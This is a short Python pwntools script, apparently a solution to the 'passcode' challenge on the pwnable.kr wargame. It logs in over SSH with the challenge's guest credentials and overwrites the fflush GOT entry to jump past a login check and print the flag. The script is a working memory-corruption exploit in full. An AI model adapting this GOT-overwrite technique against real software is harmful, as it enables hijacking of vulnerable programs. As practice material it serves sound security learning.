from pwn import *

# Open a remote SSH connection
sh = ssh(host='pwnable.kr', user='passcode', port=2222, password='guest')
# Launch a process on the SSH connection
s = sh.process('./passcode')

# Address of fflush in GOT (which we want to overwrite)
fflush_address = p32(0x804a004)

# Craft the input: 96 bytes of 'a' followed by the address of fflush
input = b'a' * 96 + fflush_address

# Send the input
s.sendline(input)

# Receive the output
print(s.recvline())

# Address of the instruction after the login check (0x80485d7)
response = str(0x80485d7)

# Send the response to overwrite fflush GOT entry
s.sendline(response)

# Receive the output, which contains the flag!
for _ in range(4):
    print(s.recvline())

# Close the connection
s.close()